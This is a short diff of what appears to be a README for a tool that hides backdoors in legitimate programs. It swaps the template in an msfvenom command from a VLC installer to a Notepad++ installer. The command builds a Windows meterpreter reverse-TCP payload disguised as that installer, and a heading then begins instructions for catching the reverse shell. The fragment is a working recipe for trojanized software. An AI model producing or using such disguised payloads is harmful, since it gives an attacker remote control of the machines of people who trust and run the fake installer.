@@ -6,7 +6,7 @@ cd CombinePayloadwithLegitimateEXE
 ```
 # Create simple backdoor using msfvenom
 ```
-sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=<YOUR HOST IP> LPORT=<YOUR HOST PORT> -x vlc-3.0.21-win64.exe -f exe -o Payload_Legit.exe
+sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=<YOUR HOST IP> LPORT=<YOUR HOST PORT> -x npp.8.7.4.Installer.x64.exe -f exe -o Payload_Legit.exe
 ```
 # Configure the Mmlti-handler to catch the reverse connection:
 
